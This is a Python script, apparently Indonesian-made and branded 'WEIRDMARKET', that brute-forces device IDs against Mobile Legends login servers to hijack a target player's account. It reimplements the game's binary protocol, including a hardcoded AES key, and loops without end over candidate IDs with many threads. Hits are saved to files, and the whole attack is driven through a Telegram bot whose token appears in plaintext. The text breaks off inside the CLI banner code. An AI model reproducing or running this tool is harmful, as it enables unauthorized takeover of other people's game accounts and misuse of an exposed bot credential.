#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BF DEVICE ID LOOPING — Standalone Tool
Brute force Device ID ke satu akun MLBB target.
Update: Unlimited Looping, tanpa input Account ID/Zone ID.
Update 2: Integrasi Telegram Bot (kontrol via Telegram, animasi di terminal).
Update 3: Input device ID via KETIK (tanpa upload file), max 15 device.
"""

import os
import sys
import time
import socket
import struct
import random
import logging
import datetime
import threading
import zlib
import asyncio
import io
import re
from enum import Enum
from typing import Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

import urllib3
import zstandard as zstd
from colorama import init, Fore, Style
from Crypto.Cipher import AES

init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── MODE ──────────────────────────────────────────────────────────────
DEBUG_MODE = False

# ── AES ───────────────────────────────────────────────────────────────
AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV  = b'\x00' * 16

# ── OUTPUT ────────────────────────────────────────────────────────────
HOME = os.path.expanduser("~")
OUTPUT_DIR = os.path.join(HOME, "storage", "downloads", "mlbb_results")
os.makedirs(OUTPUT_DIR, exist_ok=True)

BF_HIT_FILE  = os.path.join(OUTPUT_DIR, "bf_device_hits.txt")
BF_FAIL_FILE = os.path.join(OUTPUT_DIR, "bf_device_fails.txt")

# ── DEBUG ─────────────────────────────────────────────────────────────
def dbg(label, data=None, color=Fore.MAGENTA):
    if not DEBUG_MODE:
        return
    ts = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"{color}[DBG {ts}] {label}{Style.RESET_ALL}")
    if data is not None and isinstance(data, dict):
        for k, v in data.items():
            print(f"  {Fore.CYAN}[{k}] => {repr(v)[:120]}{Style.RESET_ALL}")


# ── SDP ───────────────────────────────────────────────────────────────
class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT            = 2
    DOUBLE           = 3
    STRING           = 4
    LIST             = 5
    DICT             = 6
    STRUCT_BEGIN     = 7
    STRUCT_END       = 8


class SdpException(Exception):
    pass


class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self.offset = 0
            self._unpack_from_binary()
        elif data is not None:
            super().update(data)
            self._pack_to_binary()

    def _pack_to_binary(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for tag, value in sorted(self.items()):
            self._pack(tag, value)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack_from_binary(self):
        if not self.data:
            return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            tag, value = self._unpack()
            if isinstance(value, SdpDataType) and value == SdpDataType.STRUCT_END:
                break
            self[tag] = value

    def _write_number(self, value: int) -> bytes:
        result = bytearray()
        while value >= 0x80:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)

    def _read_number(self) -> int:
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag: int, data_type: SdpDataType) -> None:
        if tag < 15:
            self.data += bytes([(data_type.value << 4) | tag])
        else:
            self.data += bytes([(data_type.value << 4) | 15])
            self.data += self._write_number(tag)

    def _pack(self, tag: int, value: Any) -> None:
        if isinstance(value, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_number(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_number(-value)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_number(value)
        elif isinstance(value, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            packed = struct.pack("<d", value)
            self.data += self._write_number(len(packed))
            self.data += packed
        elif isinstance(value, str) or isinstance(value, bytes):
            self._pack_header(tag, SdpDataType.STRING)
            encoded = value.encode('utf-8') if isinstance(value, str) else value
            self.data += self._write_number(len(encoded))
            self.data += encoded
        elif isinstance(value, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_number(len(value))
            for item in value:
                self._pack(0, item)
        elif isinstance(value, dict):
            if isinstance(value, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(value.items()):
                    self._pack(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_number(len(value))
                for k, v in sorted(value.items()):
                    self._pack(0, k)
                    self._pack(0, v)
        else:
            raise SdpException(f"Unsupported type: {type(value)}")

    def _unpack(self) -> Tuple[int, Any]:
        try:
            if self.offset >= len(self.data):
                return 0, None
            header = self.data[self.offset]
            tag = header & 0xF
            data_type = SdpDataType(header >> 4)
            self.offset += 1
            if tag == 15:
                tag = self._read_number()

            if data_type == SdpDataType.INTEGER_POSITIVE:
                return tag, self._read_number()
            elif data_type == SdpDataType.INTEGER_NEGATIVE:
                return tag, -self._read_number()
            elif data_type == SdpDataType.FLOAT:
                value = self._read_number().to_bytes(4, 'little')
                return tag, struct.unpack("<f", value)[0]
            elif data_type == SdpDataType.DOUBLE:
                value = self._read_number().to_bytes(8, 'little')
                return tag, struct.unpack("<d", value)[0]
            elif data_type == SdpDataType.STRING:
                length = self._read_number()
                try:
                    value = self.data[self.offset:self.offset + length].decode('utf-8')
                except UnicodeDecodeError:
                    value = self.data[self.offset:self.offset + length]
                self.offset += length
                return tag, value
            elif data_type == SdpDataType.LIST:
                length = self._read_number()
                value = []
                for _ in range(length):
                    _, item = self._unpack()
                    value.append(item)
                return tag, value
            elif data_type == SdpDataType.DICT:
                length = self._read_number()
                value = {}
                for _ in range(length):
                    _, k = self._unpack()
                    _, v = self._unpack()
                    value[k] = v
                return tag, value
            elif data_type == SdpDataType.STRUCT_BEGIN:
                struct_data = {}
                while True:
                    sub_tag, sub_value = self._unpack()
                    if isinstance(sub_value, SdpDataType) and sub_value == SdpDataType.STRUCT_END:
                        break
                    struct_data[sub_tag] = sub_value
                return tag, SdpStruct(struct_data)
            elif data_type == SdpDataType.STRUCT_END:
                return tag, SdpDataType.STRUCT_END
            else:
                raise SdpException("Unknown data type")
        except Exception as e:
            raise SdpException(f"Error unpacking: {e}")

    def copy(self):
        return SdpStruct(super().copy())

    def update(self, other):
        super().update(other)
        self._pack_to_binary()


# ── BASE CONNECTION ───────────────────────────────────────────────────
class BaseConnection:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket = None
        self.queue_data = b''
        self.last_header_size = 0

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, exc_type, exc, tb):
        self.cleanup()

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(2)

    def cleanup(self):
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
            self.sequence = 1
            self.socket = None

    def send_data(self, id, sdp):
        packet = SdpStruct({
            0: id,
            1: self.sequence,
            5: sdp.data
        }).data
        buf = zstd.compress(packet)
        flags = (len(buf) + 4) | (16 << 24)
        buf = flags.to_bytes(4, 'big') + buf
        self.socket.send(buf)
        self.sequence += 1

    def recv_data(self):
        try:
            while len(self.queue_data) < 4:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data

            flags = int.from_bytes(self.queue_data[:4], 'big')
            size = flags & 0xFFFFFF
            compression_type = flags >> 24
            self.last_header_size = size

            while len(self.queue_data) < size:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data

            data = self.queue_data[4:size]
            self.queue_data = self.queue_data[size:]

            if compression_type == 1:
                data = zlib.decompress(data)
            elif compression_type == 16:
                data = zstd.decompress(data)
            elif compression_type == 2:
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = cipher.decrypt(data[:-1] if len(data) % 16 != 0 else data)
                data = data.rstrip(b'\x00')
            elif compression_type == 3:
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = cipher.decrypt(data[:-1] if len(data) % 16 != 0 else data)
                data = data.rstrip(b'\x00')
                data = zlib.decompress(data)
            elif compression_type == 18:
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                decrypted_data = cipher.decrypt(data[:-1] if len(data) % 16 != 0 else data)
                data = zstd.decompress(decrypted_data.rstrip(b'\x00'))

            result = SdpStruct(data)
            pid = result[0]
            if pid is None:
                return None, None

            res = result.get(6, None)
            if not res or not isinstance(res, bytes):
                res = result.get(5, None)
                if not res or not isinstance(res, bytes):
                    return pid, None

            parsed_res = SdpStruct(res)
            return pid, parsed_res

        except socket.timeout:
            return -1, None
        except Exception:
            return None, None


# ── GAME CONNECTION ───────────────────────────────────────────────────
class GameConnection(BaseConnection):
    def __init__(self, device_id, device_model=None):
        super().__init__('login.ml.youngjoygame.com', 30021)
        self.device_id = device_id
        self.device_model = device_model or "Xiaomi:Redmi Note 12"

        parts = self.device_id.split('_')
        if len(parts) >= 2:
            device_info = parts[1]
            if len(parts) >= 3 and len(device_info) < 32:
                device_info = device_info + "_" + parts[2]
            if len(device_info) >= 32:
                self.imei_md5 = device_info[:32]
                if len(device_info) >= 48:
                    self.android_id = device_info[32:48]
                    self.advertising_id = device_info[48:] if len(device_info) > 48 else ""
                else:
                    self.android_id = ""
                    self.advertising_id = ""
            else:
                self.imei_md5 = device_info
                self.android_id = ""
                self.advertising_id = ""
        else:
            self.imei_md5 = device_id
            self.android_id = ""
            self.advertising_id = ""

        self.channel = 'and_usa'
        self.client_version = '2.2.16.1232.1'
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_server_host = ''
        self.game_server_port = 0
        self.creation_ts = 0

    def login_to_login_server(self):
        if self.host != 'login.ml.youngjoygame.com' or self.port != 30021:
            self.cleanup()
            self.host = 'login.ml.youngjoygame.com'
            self.port = 30021
            self.connect()

        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.advertising_id}&android_id={self.android_id}&device_unique_id={self.imei_md5}',
            2: self.client_version,
            3: self.channel,
            4: 'en'
        }))

        pid, res = self.recv_data()
        if pid == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res[1]
            self.zone_id = res[2][0]
            self.creation_ts = res.get(19, 0)
            return True
        return False

    def get_game_server(self):
        self.send_data(5, SdpStruct({
            0: self.account_id,
            1: self.session_key,
            2: self.client_version,
            5: self.zone_id,
            6: self.channel
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            game_server = res[1]
            self.game_server_host, self.game_server_port = game_server.split(':')
            self.game_server_port = int(self.game_server_port)
            return True
        return False

    def connect_to_game_server(self):
        self.cleanup()
        self.host = self.game_server_host
        self.port = self.game_server_port
        self.connect()

        # Kirim login packet ke game server
        self.send_data(10001, SdpStruct({
            0: self.account_id,
            1: self.session_key,
            2: self.zone_id,
            4: self.client_version,
            13: self.channel,
            15: self.device_id
        }))
        self.send_data(10101, SdpStruct({
            0: 0,
            2: 2,
        }))

        # Loop untuk mendeteksi respons
        while True:
            pid, res = self.recv_data()
            if pid is None:
                return False
            elif pid == 10002:
                # 10002 = Sukses masuk ke dalam game (artinya sesi valid)
                return True
            elif pid == -1:
                return False
            elif pid == 20001: # Pesan sistem / notifikasi (termasuk "login di perangkat lain")
                # Jika kita menerima pesan sistem, artinya koneksi berhasil sampai ke game
                return True
            
            # Jika ada pesan lain, kita anggap sebagai bagian dari proses login
            # dan lanjutkan loop sampai timeout atau dapat 10002/20001.

    def __enter__(self):
        super().__enter__()
        if not self.login_to_login_server():
            raise ConnectionError("LOGIN_FAILED")
        if not self.get_game_server():
            raise ConnectionError("SERVER_SELECTION_FAILED")
        return self


# ── BF CORE ───────────────────────────────────────────────────────────
def bf_login_with_device(device_id, device_model=None):
    result = {
        "status": "fail",
        "device_id": device_id,
        "info": None,
        "error": None,
    }
    try:
        with GameConnection(device_id=device_id, device_model=device_model) as conn:
            # Coba masuk ke game server
            if not conn.connect_to_game_server():
                result["error"] = "GAME_CONNECT_FAILED"
                return result

            # Jika berhasil connect ke game server, artinya device ID valid
            result["status"] = "success"
            result["info"] = {"account_id": conn.account_id, "zone_id": conn.zone_id}

    except ConnectionError as e:
        result["error"] = f"CONN_ERROR: {e}"
    except socket.timeout:
        result["error"] = "SOCKET_TIMEOUT"
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"

    return result


# ── FILE HELPERS ──────────────────────────────────────────────────────
file_lock = threading.Lock()

def save_line(filepath, line):
    try:
        with file_lock:
            with open(filepath, "a", encoding="utf-8") as f:
                f.write(line + "\n")
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════
# TELEGRAM BOT INTEGRATION
# ══════════════════════════════════════════════════════════════════════
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
    from telegram.ext import (
        Application, CommandHandler, CallbackQueryHandler,
        MessageHandler, filters, ContextTypes,
    )
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print(f"{Fore.YELLOW}[WARN] Modul telegram belum diinstall. Jalankan: "
          f"pip install python-telegram-bot{Style.RESET_ALL}")

BOT_TOKEN = "8090955763:AAF7noXiDbBGabQ9cwz13g_q8UF-riGrVSw"
OWNER_ID  = 7601958159
MAX_UPLOAD_SIZE = 20 * 1024 * 1024  # 20 MB (masih dipakai untuk limit file hits/fails)
MAX_DEVICES = 15  # ← MAX DEVICE ID YANG BISA DIKETIK

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)
for _l in ("httpx", "telegram", "telegram.ext"):
    logging.getLogger(_l).setLevel(logging.WARNING)


# ── BF STATE (global, dipakai CLI & bot) ─────────────────────────────
BF_STATE = {
    "running": False,
    "stop": False,
    "total_devices": 0,
    "success": 0,
    "fail": 0,
    "loop_num": 0,
    "done_in_loop": 0,
    "start_time": 0.0,
    "threads": 20,
}
BF_STATE_LOCK = threading.Lock()

BOT_USER_STATE = {}


def bot_get_state(uid):
    if uid not in BOT_USER_STATE:
        BOT_USER_STATE[uid] = {
            "awaiting": None,
            "devices": [],
            "threads": 20,
        }
    return BOT_USER_STATE[uid]


def bot_is_owner(uid):
    return uid == OWNER_ID


# ── CORE BF LOOP (dipakai CLI + bot) ─────────────────────────────────
def bf_loop(device_ids, max_threads, clear_files=False):
    """
    Loop BF unlimited.
    - Animasi & progress dicetak ke TERMINAL.
    - Kontrol stop dari bot pakai BF_STATE['stop'].
    """
    if clear_files:
        try:
            if os.path.exists(BF_HIT_FILE):
                os.remove(BF_HIT_FILE)
            if os.path.exists(BF_FAIL_FILE):
                os.remove(BF_FAIL_FILE)
        except Exception:
            pass

    success_count = 0
    fail_count = 0
    start_time = time.time()
    loop_num = 1

    with BF_STATE_LOCK:
        BF_STATE["running"] = True
        BF_STATE["stop"] = False
        BF_STATE["total_devices"] = len(device_ids)
        BF_STATE["success"] = 0
        BF_STATE["fail"] = 0
        BF_STATE["loop_num"] = 0
        BF_STATE["done_in_loop"] = 0
        BF_STATE["start_time"] = start_time
        BF_STATE["threads"] = max_threads

    try:
        while True:
            if BF_STATE.get("stop"):
                print(f"\n{Fore.YELLOW}[!] BF dihentikan via Telegram/CLI.{Style.RESET_ALL}")
                break

            with BF_STATE_LOCK:
                BF_STATE["done_in_loop"] = 0
                BF_STATE["loop_num"] = loop_num

            print(f"{Fore.CYAN}[LOOP {loop_num}] Menjalankan {len(device_ids)} device ID...{Style.RESET_ALL}")

            executor = ThreadPoolExecutor(max_workers=max_threads)
            try:
                futures = {
                    executor.submit(bf_login_with_device, did, None): did
                    for did in device_ids
                }
                done = 0
                for future in as_completed(futures):
                    if BF_STATE.get("stop"):
                        break
                    did = futures[future]
                    done += 1
                    try:
                        res = future.result(timeout=30)
                    except Exception as e:
                        res = {"status": "fail", "device_id": did, "error": str(e)}

                    if res.get("status") == "success":
                        info = res.get("info") or {}
                        acc_id = info.get("account_id", "?")
                        zone = info.get("zone_id", "?")

                        print(f"{Fore.GREEN}  [{done}/{len(device_ids)}] ✅ HIT  "
                              f"{did[:45]}... => AccID: {acc_id} | Zone: {zone}{Style.RESET_ALL}")
                        success_count += 1
                        with BF_STATE_LOCK:
                            BF_STATE["success"] = success_count
                            BF_STATE["done_in_loop"] = done
                        save_line(
                            BF_HIT_FILE,
                            f"DEVICE ID: {did} | Account ID: {acc_id} | Zone ID: {zone} "
                            f"| Loop: {loop_num}"
                        )
                    else:
                        err = res.get("error", "?")
                        print(f"{Fore.RED}  [{done}/{len(device_ids)}] ❌ FAIL "
                              f"{did[:45]}... => {err}{Style.RESET_ALL}")
                        fail_count += 1
                        with BF_STATE_LOCK:
                            BF_STATE["fail"] = fail_count
                            BF_STATE["done_in_loop"] = done
                        save_line(
                            BF_FAIL_FILE,
                            f"DEVICE ID: {did} | Error: {err} | Loop: {loop_num}"
                        )
            finally:
                executor.shutdown(wait=False, cancel_futures=True)

            if BF_STATE.get("stop"):
                break

            loop_num += 1
            print(f"{Fore.CYAN}[LOOP {loop_num}] Selesai. Lanjut ke loop berikutnya...{Style.RESET_ALL}\n")

    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}Dibatalkan oleh user (Ctrl+C).{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[ERROR] {type(e).__name__}: {e}{Style.RESET_ALL}")
    finally:
        elapsed = time.time() - start_time
        print(f"\n{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  BRUTE FORCE SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
        print(f"  Total Loop     : {loop_num - 1}")
        print(f"  Total Attempt  : {len(device_ids) * max(1, loop_num - 1)}")
        print(f"  {Fore.GREEN}Success        : {success_count}{Style.RESET_ALL}")
        print(f"  {Fore.RED}Failed         : {fail_count}{Style.RESET_ALL}")
        print(f"  Time Elapsed   : {elapsed:.2f}s")
        print(f"\n  {Fore.GREEN}Hits  → {BF_HIT_FILE}{Style.RESET_ALL}")
        print(f"  {Fore.RED}Fails → {BF_FAIL_FILE}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}\n")

        with BF_STATE_LOCK:
            BF_STATE["running"] = False
            BF_STATE["stop"] = False


# ══════════════════════════════════════════════════════════════════════
# TELEGRAM HANDLERS
# ══════════════════════════════════════════════════════════════════════
def bot_main_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 START BF", callback_data="bf_start"),
         InlineKeyboardButton("🛑 STOP BF", callback_data="bf_stop")],
        [InlineKeyboardButton("📊 STATUS", callback_data="bf_status")],
        [InlineKeyboardButton("📁 HITS FILE", callback_data="bf_get_hits"),
         InlineKeyboardButton("📁 FAILS FILE", callback_data="bf_get_fails")],
    ])


def bot_back_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️ Menu", callback_data="bf_menu")]
    ])


def bot_cancel_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Batal", callback_data="bf_menu")]
    ])


async def bot_cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    if not bot_is_owner(u.id):
        await update.message.reply_text("❌ Bot private.")
        return
    text = (
        "🌟 *BF DEVICE ID LOOPING BOT* 🌟\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Halo *{u.first_name}*! 👋\n\n"
        "Menu kontrol:\n"
        f"  🚀 *START BF* — Ketik device ID (max {MAX_DEVICES})\n"
        "  🛑 *STOP BF* — Hentikan loop\n"
        "  📊 *STATUS* — Cek progress\n"
        "  📁 *HITS / FAILS* — Ambil file hasil\n\n"
        "ℹ️ _Animasi BF tetap running di terminal VPS._\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "_WEIRDMARKET • OFFICIAL TOOLS_"
    )
    await update.message.reply_text(
        text, parse_mode="Markdown", reply_markup=bot_main_menu_kb())


async def bot_cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    st = bot_get_state(update.effective_user.id)
    st["awaiting"] = None
    st["devices"] = []
    await update.message.reply_text(
        "❌ Dibatalkan.", reply_markup=bot_main_menu_kb())


async def bot_button_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not bot_is_owner(q.from_user.id):
        return
    data = q.data
    st = bot_get_state(q.from_user.id)

    if data == "bf_menu":
        st["awaiting"] = None
        try:
            await q.message.edit_text(
                "🌟 *BF DEVICE ID LOOPING BOT* 🌟\n"
                "━━━━━━━━━━━━━━━━━━━━━\n\n"
                "Pilih menu:",
                parse_mode="Markdown", reply_markup=bot_main_menu_kb())
        except Exception:
            pass

    elif data == "bf_start":
        st["awaiting"] = "devices"
        st["devices"] = []
        await q.message.reply_text(
            f"📱 *Kirim Device ID* (max {MAX_DEVICES})\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Format:\n"
            "• Satu per baris, atau\n"
            "• Dipisah spasi / koma\n"
            "• Harus mulai `and_`\n\n"
            "Contoh:\n"
            "`and_abc123...`\n"
            "`and_def456...`",
            parse_mode="Markdown", reply_markup=bot_cancel_kb())

    elif data == "bf_stop":
        if BF_STATE.get("running"):
            BF_STATE["stop"] = True
            await q.message.reply_text(
                "🛑 Sinyal stop dikirim ke terminal...\n"
                "Tunggu sampai loop saat ini selesai.",
                reply_markup=bot_main_menu_kb())
        else:
            await q.message.reply_text(
                "ℹ️ BF tidak sedang berjalan.",
                reply_markup=bot_main_menu_kb())

    elif data == "bf_status":
        with BF_STATE_LOCK:
            running = BF_STATE.get("running", False)
            total = BF_STATE.get("total_devices", 0)
            success = BF_STATE.get("success", 0)
            fail = BF_STATE.get("fail", 0)
            loop_num = BF_STATE.get("loop_num", 0)
            done = BF_STATE.get("done_in_loop", 0)
            start_time = BF_STATE.get("start_time", 0)
            threads = BF_STATE.get("threads", 0)

        if running:
            elapsed = time.time() - start_time if start_time else 0
            pct = int(done / max(total, 1) * 100)
            bar = "▰" * int(pct / 10) + "▱" * (10 - int(pct / 10))
            txt = (
                "📊 *BF STATUS*\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"▶️ Status       : *RUNNING*\n"
                f"🔄 Loop         : `{loop_num}`\n"
                f"🧵 Threads      : `{threads}`\n"
                f"📱 Total Device : `{total}`\n"
                f"📊 Progress     : `{done}/{total}` ({pct}%)\n"
                f"`{bar}`\n\n"
                f"✅ Hits         : `{success}`\n"
                f"❌ Fail         : `{fail}`\n"
                f"⏱️ Elapsed      : `{int(elapsed)}s`"
            )
        else:
            txt = (
                "📊 *BF STATUS*\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                "⏹️ Status: *IDLE* (tidak berjalan)\n\n"
                f"📱 Last devices : `{total}`\n"
                f"✅ Last hits    : `{success}`\n"
                f"❌ Last fail    : `{fail}`\n"
                f"🔄 Last loop    : `{loop_num}`"
            )
        try:
            await q.message.edit_text(txt, parse_mode="Markdown",
                                      reply_markup=bot_main_menu_kb())
        except Exception:
            await q.message.reply_text(txt, parse_mode="Markdown",
                                       reply_markup=bot_main_menu_kb())

    elif data == "bf_get_hits":
        if os.path.exists(BF_HIT_FILE) and os.path.getsize(BF_HIT_FILE) > 0:
            with open(BF_HIT_FILE, "rb") as f:
                await q.message.reply_document(
                    document=InputFile(f, filename="bf_device_hits.txt"),
                    caption="✅ *BF HITS FILE*",
                    parse_mode="Markdown")
        else:
            await q.message.reply_text(
                "ℹ️ File hits masih kosong / belum ada.",
                reply_markup=bot_main_menu_kb())

    elif data == "bf_get_fails":
        if os.path.exists(BF_FAIL_FILE) and os.path.getsize(BF_FAIL_FILE) > 0:
            with open(BF_FAIL_FILE, "rb") as f:
                await q.message.reply_document(
                    document=InputFile(f, filename="bf_device_fails.txt"),
                    caption="❌ *BF FAILS FILE*",
                    parse_mode="Markdown")
        else:
            await q.message.reply_text(
                "ℹ️ File fails masih kosong / belum ada.",
                reply_markup=bot_main_menu_kb())


async def bot_on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    if not bot_is_owner(u.id):
        return
    st = bot_get_state(u.id)
    text = (update.message.text or "").strip()
    awaiting = st.get("awaiting")

    # ── STATE: menunggu DEVICE ID ──────────────────────────────────
    if awaiting == "devices":
        if not text:
            await update.message.reply_text(
                "❌ Tidak ada device ID.", reply_markup=bot_cancel_kb())
            return

        # Split by newline, spasi, koma, semicolon
        tokens = re.split(r"[\s,;]+", text)
        devices = []
        seen = set()
        invalid_tokens = []

        for tok in tokens:
            tok = tok.strip()
            if not tok:
                continue
            if tok.startswith("and_"):
                key = tok.lower()
                if key not in seen:
                    seen.add(key)
                    devices.append(tok)
            else:
                invalid_tokens.append(tok)

        if not devices:
            await update.message.reply_text(
                "❌ Tidak ada Device ID valid (harus mulai `and_`)\n\n"
                "Coba kirim ulang:",
                parse_mode="Markdown", reply_markup=bot_cancel_kb())
            return

        if len(devices) > MAX_DEVICES:
            await update.message.reply_text(
                f"⚠️ *Terlalu banyak device!*\n\n"
                f"Max: `{MAX_DEVICES}`\n"
                f"Kamu kirim: `{len(devices)}`\n\n"
                f"Kurangi dulu, lalu kirim ulang.",
                parse_mode="Markdown", reply_markup=bot_cancel_kb())
            return

        st["devices"] = devices
        st["awaiting"] = "threads"

        # Preview
        preview_lines = []
        for i, d in enumerate(devices, 1):
            disp = d if len(d) <= 50 else d[:47] + "..."
            preview_lines.append(f"  `{i}.` `{disp}`")
        preview_txt = "\n".join(preview_lines)

        info_invalid = ""
        if invalid_tokens:
            info_invalid = (
                f"\n\n⚠️ *{len(invalid_tokens)} token diabaikan* "
                f"(bukan `and_`)"
            )

        await update.message.reply_text(
            f"✅ *{len(devices)} Device ID diterima*\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{preview_txt}"
            f"{info_invalid}\n\n"
            f"Kirim *jumlah threads* (1–50)\n"
            f"atau ketik `20` untuk default.",
            parse_mode="Markdown")
        return

    # ── STATE: menunggu THREADS ────────────────────────────────────
    if awaiting == "threads":
        try:
            threads = int(text)
        except ValueError:
            threads = 20
        threads = max(1, min(50, threads))
        st["threads"] = threads
        st["awaiting"] = None

        if not st.get("devices"):
            await update.message.reply_text(
                "❌ Belum ada device. Tap START BF lagi.",
                reply_markup=bot_main_menu_kb())
            return

        if BF_STATE.get("running"):
            await update.message.reply_text(
                "⚠️ BF masih berjalan. Stop dulu sebelum start ulang.",
                reply_markup=bot_main_menu_kb())
            return

        # Jalankan di background thread
        loop = asyncio.get_running_loop()
        loop.run_in_executor(
            None, bf_loop, st["devices"].copy(), threads, True)

        await update.message.reply_text(
            f"🚀 *BF DIMULAI!*\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 Devices: `{len(st['devices'])}`\n"
            f"🧵 Threads: `{threads}`\n"
            f"🔄 Mode   : Unlimited Loop\n\n"
            f"ℹ️ Animasi running di terminal VPS.\n"
            f"Gunakan 📊 STATUS untuk cek progress.",
            parse_mode="Markdown", reply_markup=bot_main_menu_kb())
        return

    # ── Fallback: tanpa state ─────────────────────────────────────
    await update.message.reply_text(
        "ℹ️ Pilih menu dulu untuk memulai.",
        reply_markup=bot_main_menu_kb())


# ── Bot runner ───────────────────────────────────────────────────────
async def bot_post_init(app):
    try:
        await app.bot.delete_webhook(drop_pending_updates=True)
        me = await app.bot.get_me()
        print(f"🤖 Bot: @{me.username} (id: {me.id})")
    except Exception as e:
        print(f"[POST_INIT] {e}")


def run_telegram_bot():
    if not TELEGRAM_AVAILABLE:
        print(f"{Fore.RED}❌ Modul telegram tidak tersedia. "
              f"Install: pip install python-telegram-bot{Style.RESET_ALL}")
        sys.exit(1)

    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        print(f"{Fore.RED}❌ Token invalid!{Style.RESET_ALL}")
        sys.exit(1)

    print(f"{Fore.MAGENTA}{'=' * 60}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}  BF DEVICE ID LOOPING — TELEGRAM BOT MODE{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{'=' * 60}{Style.RESET_ALL}")
    print(f"  Token    : {BOT_TOKEN[:20]}...")
    print(f"  Owner    : {OWNER_ID}")
    print(f"  Max Dev  : {MAX_DEVICES} (diketik, tanpa upload file)")
    print(f"  Output   : {OUTPUT_DIR}")
    print(f"  Hits     : {BF_HIT_FILE}")
    print(f"  Fails    : {BF_FAIL_FILE}")
    print(f"{Fore.MAGENTA}{'=' * 60}{Style.RESET_ALL}\n")

    app = Application.builder().token(BOT_TOKEN).post_init(bot_post_init).build()

    app.add_handler(CommandHandler("start", bot_cmd_start))
    app.add_handler(CommandHandler("cancel", bot_cmd_cancel))
    app.add_handler(CallbackQueryHandler(bot_button_router))
    # NOTE: Handler dokumen dihapus — input device ID via ketik
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND, bot_on_text))

    print(f"{Fore.GREEN}✅ Bot running... (animasi BF akan muncul di terminal ini){Style.RESET_ALL}")
    app.run_polling(allowed_updates=Update.ALL_TYPES,
                    drop_pending_updates=True)


# ══════════════════════════════════════════════════════════════════════
# CLI MODE (Original)
# ══════════════════════════════════════════════════════════════════════
def banner():
    print(f"{Fore.MAGENTA}")
    for line in [
